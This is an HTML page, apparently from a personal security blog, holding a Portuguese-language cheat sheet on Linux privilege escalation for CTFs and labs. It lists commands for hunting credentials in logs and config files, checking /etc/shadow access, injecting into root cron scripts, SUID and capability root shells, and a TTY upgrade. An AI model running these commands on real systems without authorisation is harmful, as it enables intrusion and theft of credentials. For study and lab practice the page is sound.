@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Linux Privilege Escalation — cheat sheet | lucas.albino</title>
+<meta name="description" content="Cheat sheet de escalonamento de privilégios em Linux: enumeração, SUID, cron, capabilities e pós-exploração.">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' rx='18' fill='%230a0e13'/><text y='68' x='50' text-anchor='middle' font-size='58' font-family='monospace' fill='%23ff2b3d'>&gt;_</text></svg>">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body>
+
+<nav class="nav">
+  <div class="wrap nav-in">
+    <a class="brand" href="../index.html"><span class="sig">&gt;_</span> lucas<span class="sig">.</span>albino</a>
+    <button class="nav-toggle" aria-label="Abrir menu" aria-expanded="false">&#9776;</button>
+    <div class="nav-links">
+      <a href="../index.html#sobre">./sobre</a>
+      <a href="../index.html#exp">./exp</a>
+      <a href="../index.html#labs">./labs</a>
+      <a href="../writeups.html" class="active">./writeups</a>
+      <a href="../index.html#contato">./contato</a>
+    </div>
+  </div>
+</nav>
+
+<article class="article">
+  <div class="wrap prose">
+    <a class="back" href="../writeups.html">&larr; writeups</a>
+
+    <div class="article-head">
+      <div class="post-meta">
+        <span>ago 2026</span>
+        <span class="chip blue">Linux</span>
+        <span class="chip red">Privilege Escalation</span>
+        <span>cheat sheet</span>
+      </div>
+      <h1>Linux Privilege Escalation — cheat sheet</h1>
+      <p style="color:var(--txt-dim);margin:0">
+        Guia rápido para escalonamento de privilégios em Linux, focado em enumeração manual e
+        exploração de vetores comuns encontrados em CTFs e ambientes reais.
+      </p>
+    </div>
+
+    <div class="disclosure">
+      <strong>// disclaimer</strong><br>
+      Conteúdo criado exclusivamente para fins educacionais e de estudo em segurança ofensiva.
+      Usar estas técnicas em sistemas sem autorização prévia é ilegal. Consolidado durante
+      workshops e laboratórios práticos como guia de consulta rápida.
+    </div>
+
+    <h2>1. Enumeração de sistema &amp; ambiente</h2>
+    <p>O primeiro passo é entender onde você está e o que o usuário atual andou fazendo.</p>
+
+    <h3>Informações do sistema</h3>
+    <pre><code>uname -a                # Kernel, arquitetura e versão do SO
+cat /etc/os-release     # Detalhes da distribuição</code></pre>
+
+    <h3>Histórico de comandos</h3>
+    <pre><code>cat ~/.bash_history     # Pode conter senhas digitadas ou caminhos sensíveis</code></pre>
+
+    <h3>Serviços internos</h3>
+    <p>Identificar serviços rodando apenas localmente — podem ser vetores de escalonamento.</p>
+    <pre><code>ss -tlnp                # Lista portas e serviços ativos</code></pre>
+
+    <h2>2. Busca de arquivos e segredos</h2>
+    <p>Use <code>find</code> e <code>grep</code> para localizar configuração, backups ou credenciais expostas.</p>
+
+    <h3>Comando <code>find</code></h3>
+    <pre><code># Busca por nome ignorando maiúsculas/minúsculas
+find / -name "*flag*" -type f 2>/dev/null
+
+# Busca por extensões sensíveis (.env, .conf, .bak)
+find / -name "*.env" -o -name "*.conf" -o -name "*.bak" -type f 2>/dev/null
+
+# Filtrar por diretório específico (ex: /opt)
+find /opt -name "config.txt" -type f</code></pre>
+
+    <h3>Comando <code>grep</code></h3>
+    <pre><code># Buscar palavras-chave no diretório de logs de forma recursiva
+grep -iEr "password|token|secret|cred" /var/log/ 2>/dev/null
+
+# Analisar logs de acesso web por padrões específicos
+grep -iE "robots|token|password|secret|cred" access.log</code></pre>
+
+    <h2>3. Permissões de arquivos e credenciais</h2>
+    <p>Entender as permissões Linux (rwx) é fundamental para identificar falhas de segurança.</p>
+    <p><strong>Arquivos críticos —</strong> verifique se arquivos sensíveis têm permissões de leitura/escrita indevidas:</p>
+    <pre><code>ls -la /etc/shadow      # Se tiver leitura, dá pra tentar crackear os hashes
+ls -la /etc/passwd      # Se tiver escrita, dá pra criar um usuário root</code></pre>
+    <p><strong>Movimentação lateral —</strong> senhas encontradas em <code>.env</code> / <code>.bak</code> costumam ser reutilizadas por outro usuário ou pelo root:</p>
+    <pre><code>su &lt;usuario&gt;            # Tente trocar de usuário com as senhas encontradas</code></pre>
+
+    <h2>4. Agendamento de tarefas (cron jobs)</h2>
+    <p>Tarefas que rodam automaticamente como root são vetores críticos.</p>
+    <pre><code>cat /etc/crontab</code></pre>
+    <blockquote>
+      <p><strong>Vetor de ataque:</strong> se um script executado pelo cron for editável pelo seu
+      usuário, dá pra injetar comandos para ganhar shell de root ou alterar permissões.</p>
+      <p>Exemplo de injeção: <code>echo "chmod +s /bin/bash" &gt;&gt; /caminho/do/script.sh</code></p>
+    </blockquote>
+
+    <h2>5. Binários SUID (Set User ID)</h2>
+    <p>Arquivos com o bit SUID permitem executar com os privilégios do dono (geralmente root).</p>
+    <pre><code># Encontrar binários SUID
+find / -perm -u+s -type f 2>/dev/null</code></pre>
+    <p><strong>Exploração via GTFOBins:</strong> encontrando um binário incomum ou um utilitário
+    conhecido (<code>find</code>, <code>cp</code>, <code>vim</code>), consulte o GTFOBins.</p>
+    <pre><code># Exemplo — se o find tiver SUID
+./find . -exec /bin/sh -p \; -quit</code></pre>
+
+    <h2>6. Linux capabilities</h2>
+    <p>Capabilities dividem os privilégios do root em pequenos pedaços, permitindo que binários
+    executem funções específicas sem serem totalmente root.</p>
+    <pre><code># Listar capabilities de arquivos
+getcap -r / 2>/dev/null
+
+# Exemplo de exploração (Python)
+python3 -c "import os; os.setuid(0); os.execl('/bin/bash', '/bin/sh')"</code></pre>
+
+    <h2>7. Dicas de pós-exploração</h2>
+    <pre><code># Melhorar a shell (upgrade TTY)
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# Verificar SUDO — o que seu usuário pode rodar como sudo
+sudo -l</code></pre>
+
+    <p style="margin-top:40px">
+      <a class="back" href="../writeups.html">&larr; voltar para writeups</a>
+      &nbsp;·&nbsp;
+      <a href="https://github.com/LucasRAlbino/The-Hacking-Lab/tree/main/Privilege%20Escalation/Linux" target="_blank" rel="noopener">fonte no GitHub &nearr;</a>
+    </p>
+  </div>
+</article>
+
+<footer>
+  <div class="wrap foot-in">
+    <span>&copy; <span id="year">2026</span> lucas rodrigues albino</span>
+    <span>Campina Grande, PB · BR</span>
+    <span><a href="../index.html">início</a></span>
+  </div>
+</footer>
+
+<script src="../assets/js/main.js"></script>
+</body>
+</html>
